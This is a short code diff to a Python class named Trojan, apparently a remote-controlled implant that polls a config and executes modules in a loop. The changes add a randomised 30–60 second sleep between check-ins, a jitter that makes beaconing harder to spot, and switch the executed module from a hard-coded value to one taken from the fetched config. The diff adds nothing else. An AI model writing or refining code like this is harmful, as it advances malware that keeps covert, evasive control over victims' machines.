@@ -1,4 +1,4 @@
-import asyncio
+import random
 import json
 import os
 from time import sleep
@@ -19,7 +19,7 @@ class Trojan:
         
         while True:
             self.controller()
-            sleep(30)
+            sleep(random.randint(30, 60))
 
     def get_config(self):
         self.config = Config().get_config()
@@ -41,8 +41,7 @@ class Trojan:
 
     
     def controller(self):
-        #module = self.config['module']
-        module = 3
+        module = self.config['module']
         self.reset_modules()
         print('EXECUTING MODULE', module)
 
